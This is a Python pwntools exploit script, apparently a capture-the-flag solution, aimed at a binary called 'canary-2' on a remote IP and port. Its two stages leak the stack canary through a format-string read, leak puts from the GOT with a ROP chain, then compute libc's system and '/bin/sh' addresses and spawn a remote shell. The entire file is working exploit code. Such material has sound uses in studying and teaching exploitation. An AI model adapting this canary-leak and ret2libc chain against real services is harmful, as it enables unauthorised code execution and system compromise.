#!/usr/bin/env python3
from pwn import *

BIN  = "./canary-2"
IP   = "141.85.224.106"
PORT = "31343"

context.bits = 64
context.endian = 'little'
context.binary = BIN
context.log_level = 'debug'
# io = process(BIN)
io = remote(IP, PORT)


# Stage 1 - leak canary
print("------------- Stage 1 - Leak canary & puts -------------")

# Garbage
io.recv()

# Format string to get canary
io.send(b"y " + b"%9$llx>> " + b"\n")

# Recv until >>
to_process = io.recvuntil(b">> ")
canary = int(b"0x" + (to_process[-19:-3]), 16)
print(hex(canary))

# Junk
io.recv()

# Payload with canary
payload_up_to_address = b"n".ljust(24, b"\x41") + p64(canary) + b"B" * 8

libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
system_libc_offset = libc.symbols['system']
puts_libc_offset = libc.symbols['puts']
bin_sh_offset = next(libc.search(b'/bin/sh'))

# Offsets found
print(hex(system_libc_offset))
print(hex(puts_libc_offset))
print(hex(bin_sh_offset))

# Addresses of the binary
pop_rdi_ret = 0x400823
puts_got = 0x601018
puts_plt = 0x400570
main = 0x400799

# gdb.attach(io)

# Leak puts in libc to get address and jump back to main
io.send(payload_up_to_address + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) + b"\n")

# Stage 2 - leak libc address
print("------------- Stage 2 - Call system -------------")
# Junk
io.recvuntil(b"!\n")

# Calculate address of system and bin/sh using offsets and the leak
puts_libc = unpack(io.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))
system_libc = puts_libc - puts_libc_offset + system_libc_offset
bin_sh_libc = puts_libc - puts_libc_offset + bin_sh_offset

# The addresses
print(hex(system_libc))
print(hex(puts_libc))
print(hex(bin_sh_libc))

# Junk
io.recv()

# Payload with the call to system
io.send(payload_up_to_address + p64(pop_rdi_ret) + p64(bin_sh_libc) + p64(system_libc) + b"\n")

# Get the shell
io.interactive()
